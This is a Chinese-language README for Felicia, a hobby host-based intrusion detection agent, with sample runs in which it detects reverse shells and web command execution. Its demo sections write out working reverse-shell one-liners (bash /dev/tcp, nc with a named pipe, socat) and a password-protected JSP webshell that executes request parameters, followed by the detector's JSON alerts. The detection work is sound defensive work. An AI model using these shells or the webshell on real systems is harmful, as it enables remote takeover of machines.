# Felicia
Simple HIDS/EDR (目前仍在持续开发中...)
## Desc
自己写着玩的一个小项目，功能、架构设计已经完成，但由于时间、人力非常有限，代码化比较缓慢，目前只有agent无server，且入侵检测这块目前只支持反弹shell、web rce两块，后续有时间其它功能会慢慢补上。
## How to use
```
root@ubuntu:~# cd Felicia/
root@ubuntu:~/Felicia# make
gcc felicia_plugin_reverse_shell.c felicia_main.c felicia_data_struct.c felicia_process_monitor.c felicia_process_handler.c \
felicia_init.c felicia_plugin_web_rce.c cJSON.c -o demo
root@ubuntu:~/Felicia# ./demo
```
## Sample

#### 反弹shell

**受害机：**

```
bash -i >&/dev/tcp/192.168.31.162/7777 0>&1
```

or

```
mknod backpipe p; nc 192.168.31.162 7777 0<backpipe | bash 1>backpipe 2>backpipe
```

or

```
socat TCP4:192.168.30.127:1234 EXEC:bash,pty,stderr,setsid,sigint,sane
```

or else...

**攻击机：**

```
nc -lk 7777
```

**检测结果：**

```
root@ubuntu:~/Felicia# ./demo
reverse shell event
{
  'evt':'rvshell'
  'pid':'19256'
  'exe':'/bin/bash'
  'cmdline':'bash'
  'cwd':'/root/Felicia'
  'ppid':'19255'
  'pexe':'/usr/bin/socat'
  'pcmdline':'socat TCP4:192.168.31.162:7777 EXEC:bash,pty,stderr,setsid,sigint,sane'
  'uid':'0'
  'pname':'bash'
  'stdin':'/dev/pts/3'
  'stdout':'/dev/pts/3'
  'srcip':'192.168.31.115'
  'dstip':'192.168.31.162'
  'srcport':'43696'
  'dstport':'7777'
  'tty':'/dev/pts/3'
  'unixtime':'0'
}

root@ubuntu:~/Felicia# ./demo
reverse shell event
{
  'evt':'rvshell'
  'pid':'19230'
  'exe':'/bin/bash'
  'cmdline':'bash'
  'cwd':'/root/Felicia'
  'ppid':'14615'
  'pexe':'/bin/bash'
  'pcmdline':'-bash'
  'uid':'0'
  'pname':'bash'
  'stdin':'pipe:[140445]'
  'stdout':'/root/Felicia/backpipe'
  'srcip':'192.168.31.115'
  'dstip':'192.168.31.162'
  'srcport':'43694'
  'dstport':'7777'
  'tty':'/dev/pts/4'
  'unixtime':'0'
}

root@ubuntu:~/Felicia# ./demo
reverse shell event
{
  'evt':'rvshell'
  'pid':'18705'
  'exe':'/bin/bash'
  'cmdline':'bash -i'
  'cwd':'/root/Felicia'
  'ppid':'14615'
  'pexe':'/bin/bash'
  'pcmdline':'-bash'
  'uid':'0'
  'pname':'bash'
  'stdin':'socket:[136198]'
  'stdout':'socket:[136198]'
  'srcip':'192.168.31.115'
  'dstip':'192.168.31.162'
  'srcport':'43658'
  'dstport':'7777'
  'tty':'/dev/pts/4'
  'unixtime':'0'
}
```



#### web rce

vulnhub tomcat8靶场测试 jsp小马执行命令

**受害机：**

```
root@06bc32a5536b:/usr/local/tomcat/webapps/ROOT# cat getshell.jsp
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

**攻击机：**

```
http://192.168.31.115:8007/getshell.jsp?pwd=023&i=ls
```

**检测结果：**

```
root@ubuntu:~/Felicia# ./demo
web rce event
{
  'evt':'webrce'
  'pid':'19484'
  'exe':'/bin/ls'
  'cmdline':'ls'
  'cwd':'/usr/local/tomcat'
  'ppid':'15594'
  'pexe':'/usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java'
  'pcmdline':'/usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava./proc/19484/exe'
  'uid':'0'
  'pname':'ls'
  'stdin':'pipe:[141299]'
  'stdout':'pipe:[141300]'
  'tty':' '
  'unixtime':'0'
}
```



## TODO

- 威胁情报
- 敏感文件变更
- server（包含前端）
- 线程池
- else...



## Link

https://driverxdw.github.io/2020/12/14/Felicia-Hids-Demo-Design/

